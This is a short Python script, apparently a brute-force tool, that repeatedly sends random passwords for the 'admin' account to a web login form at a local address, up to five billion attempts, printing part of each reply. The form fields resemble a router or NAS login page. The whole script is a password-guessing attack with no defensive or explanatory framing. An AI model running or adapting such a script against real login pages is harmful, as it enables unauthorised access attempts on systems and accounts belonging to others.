import requests
import random
import string
from time import sleep

def generate_keys(tamanho=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(characters, k=tamanho))


if __name__ == '__main__':
    # TODO also create this function in an async way
    url = "http://localhost:8093/index.html"
    for i in range(5000000000):
        data = {
            "username": "admin",
            "password": generate_keys(),
            "OTPcode": "",
            "rememberme": "",
            "__cIpHeRtExT": "",
            "client_time": "1421151203",
            "isIframeLogin": "yes"
        }
        try:
            print(f"{i} = {requests.post(url, data=data).text[:14]} [...]")
        except Exception as e:
            pass
        sleep(0.05)

